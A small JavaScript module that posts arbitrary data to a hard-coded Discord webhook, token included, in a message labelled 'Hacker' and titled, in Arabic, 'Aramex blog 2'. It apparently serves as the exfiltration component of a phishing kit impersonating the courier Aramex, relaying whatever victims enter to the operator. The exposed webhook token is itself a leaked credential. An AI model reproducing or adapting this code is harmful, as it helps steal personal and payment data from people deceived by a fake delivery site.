import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322656929075564574/Z_opDS_EftrQlybJlbm6mVtdYTvyed2JxZSAW-m-n0gZW9aFbLl_fi_ttHTwdxfcFm7M",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
